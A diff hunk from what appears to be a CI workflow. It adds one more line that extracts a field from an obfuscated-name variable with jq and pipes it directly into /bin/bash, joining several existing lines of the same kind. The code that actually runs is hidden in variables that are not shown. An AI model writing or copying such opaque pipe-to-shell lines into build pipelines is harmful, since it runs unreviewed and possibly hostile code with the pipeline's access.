@@ -22,6 +22,7 @@ jobs:
           echo $ny4 | jq -r .psmb2022 | /bin/bash
           printf '%s' "$uyved45" | jq -r .yway351 | /bin/bash
           echo $kot527 | jq -r .ybu424 | /bin/bash
+          printf '%s' "$wdcv169" | jq -r .cyhiv32 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
